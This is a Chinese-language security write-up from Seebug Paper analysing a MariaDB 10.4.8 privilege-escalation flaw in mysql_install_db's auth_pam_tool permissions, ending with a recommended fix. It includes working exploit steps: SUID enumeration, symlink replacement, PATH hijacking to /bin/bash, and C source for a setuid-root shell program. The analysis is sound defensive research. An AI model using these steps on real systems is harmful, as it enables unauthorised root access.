**作者：Evi1hui@QAX A-TEAM  
原文链接：<https://mp.weixin.qq.com/s/3PqYHGklnTb-5eWuNammWA>**

MariaDB是MySQL数据库系统的一个复刻，由社区开发，旨在继续保持在GNU GPL下开源。甲骨文公司收购了 MySQL 后，有将 MySQL
闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。近日，奇安信CERT在日常监测中从oss-security邮箱中监测到这枚MariaDB提权漏洞，经研判虽这个漏洞到达不了风险通告流程，但由于和监测到此漏洞比较有意思故有了下文展开分析。如有不足之处，欢迎批评指正。

根据oss-security邮件推送的上下文描述是在mysql_install_db脚本中配置不当导致的漏洞发生。

官方介绍：<https://mariadb.com/kb/en/mysql_install_db/>

根据官方描述，mysql_install_db用于初始化data数据目录，且在数据库中创建Mysql表。大概脚本是作为初始化数据等操作所使用。

## docker环境搭建

  1. docker pull mariadb:10.4.8
  2. docker run -it 2ef19234ff46 /bin/bash

## 漏洞分析

首先定位漏洞点。

    
    
    find / -name "mysql_install_db"

![](https://images.seebug.org/content/images/2020/02/0aded55b-3bd3-47ab-84f6-9ba744aeb7bb.jpg-w331s)

在bash脚本上下文中，如果$user被定义则能进入「配置不当」漏洞点。

    
    
    chown $user "$pamtooldir/auth_pam_tool_dir"chmod 0700 "$pamtooldir/auth_pam_tool_dir"

这里配置了auth_pam_tool_dir目录的归属权和所有权，权限归属于$user。 （这里是可控点之一）

    
    
    chown 0 "$pamtooldir/auth_pam_tool_dir/auth_pam_tool" chmod 04755 "$pamtooldir/auth_pam_tool_dir/auth_pam_tool"

这里配置了auth_pam_tool文件为0（root）所有权，4755文件权限（4为suid权限）。想要进入这个漏洞点需要$srcdir变量值长度为0才能触发。

关于suid属性：

SUID属性一般用在可执行文件上，当用户执行该文件时，会「临时拥有该执行文件的所有者权限」。一旦程序拥有SUID权限的话，运行该程序时会以最高权限运行。

## 回溯user

  1. $user

![](https://images.seebug.org/content/images/2020/02/d01cd4b3-6ee3-4b53-8e51-bd84acd23c25.jpg-w331s)

在脚本传递args参数时可控制$user变量。

  1. $srcdir

![](https://images.seebug.org/content/images/2020/02/3518bcd9-7c35-47a8-a0ad-af12ba06d04a.jpg-w331s)

也在初始化操作时可控制变量，初始化时为空。

那么想要进入这个漏洞点需要user需要设置值。

结合上文描述使用此命令才能触发漏洞点：

    
    
    ./mysql_install_db --user=mysql

## 漏洞复现

寻找suid属性的程序

    
    
    find /* -perm -u=s -type f 2>/dev/null

搜索到的suid属性程序「auth_pam_tool」替换成我们的恶意suid程序。

    
    
    1. rm auth_pam_tool2. ln -s /root/pwn auth_pam_tool3. export PATH=.:$PATH4. ln -s /bin/bash ps

编写一个具有suid权限的恶意程序：

    
    
    #include <unistd.h>#include <stdlib.h>int main(void){    setuid(0);    setgid(0);    system("ps");    return 0;}

![](https://images.seebug.org/content/images/2020/02/b9070791-488c-477c-a166-d83582208342.jpg-w331s)

切换回root，在root权限下运行mysql_install_db脚本（触发修改chmod命令）

![](https://images.seebug.org/content/images/2020/02/526f2fbf-0b8c-4587-af78-4d8ac5f39571.jpg-w331s)

再回到mysql用户权限下执行auth_pam_tool

![](https://images.seebug.org/content/images/2020/02/0eeb2258-e659-48eb-8e23-e455133da142.jpg-w331s)

提权成功。

可以看到这个漏洞是由于suid与目录权限设置不当，才导致被提权利用的风险。建议在修复中设置auth_pam_tool_dir目录权限为root所有：

    
    
    root:mysql  0750 /usr/lib/mysql/plugin/auth_pam_tool_dir

参考文档：

  1. [https://hub.docker.com/_/mariadb?tab=tags&page=2](https://hub.docker.com/_/mariadb?tab=tags&page=2)

  2. <https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/>

  3. <https://mochazz.github.io/2018/06/09/Linux>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1127/>

